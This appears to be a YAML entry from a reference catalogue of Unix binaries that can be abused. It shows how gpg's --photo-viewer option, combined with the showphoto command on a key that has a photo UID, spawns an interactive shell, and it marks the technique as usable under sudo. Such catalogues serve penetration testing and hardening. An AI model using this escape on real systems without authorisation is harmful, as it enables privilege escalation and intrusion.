---
functions:
  shell:
  - code: |-
      gpg --homedir /path/to/keyring --photo-viewer '/bin/sh -c "exec /bin/sh -i < /dev/tty > /dev/tty 2>&1"' --edit-key KEY
    comment: |-
      The key must contain a JPEG photo UID. At the `gpg>` prompt, select it with `uid <n>` and run `showphoto` to spawn the shell.
    contexts:
      sudo:
      unprivileged:
...
